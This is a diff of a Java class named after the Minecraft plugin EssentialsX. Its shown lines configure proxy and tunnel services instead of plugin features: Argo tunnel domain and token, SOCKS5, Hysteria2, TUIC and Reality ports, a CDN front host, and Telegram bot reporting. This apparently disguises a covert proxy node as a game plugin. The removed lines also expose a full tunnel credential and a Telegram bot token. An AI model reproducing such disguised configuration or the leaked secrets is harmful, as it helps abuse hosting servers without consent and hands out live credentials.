@@ -75,8 +75,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "45a57b6b-753c-4b7d-8b2f-26062b3262cc");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "fmhing.1791765.xyz");
-        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiNzk5YjY1OGMtMjEyZi00ZjQwLWJkYzQtNzA2NTJhZjRiOTMzIiwicyI6Ik1XVmlOekZsT0dZdE16QmlaQzAwT1RjNUxXSmlOVEl0WldRMlpXRmlOMlk0WVdZeiJ9");
+        env.put("ARGO_DOMAIN", "fmh.1791765.xyz");
+        env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "5079");
         env.put("HY2_PORT", "5079");
         env.put("TUIC_PORT", "");
@@ -85,7 +85,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "8093926960");
-        env.put("BOT_TOKEN", "8396677288:AAGCpsBEDOjKkQuuNZgk7U3xanOsKS2M6U8");
+        env.put("BOT_TOKEN", "");
         env.put("CFIP", "store.ubi.com");
         env.put("CFPORT", "443");
         env.put("NAME", "FMH");
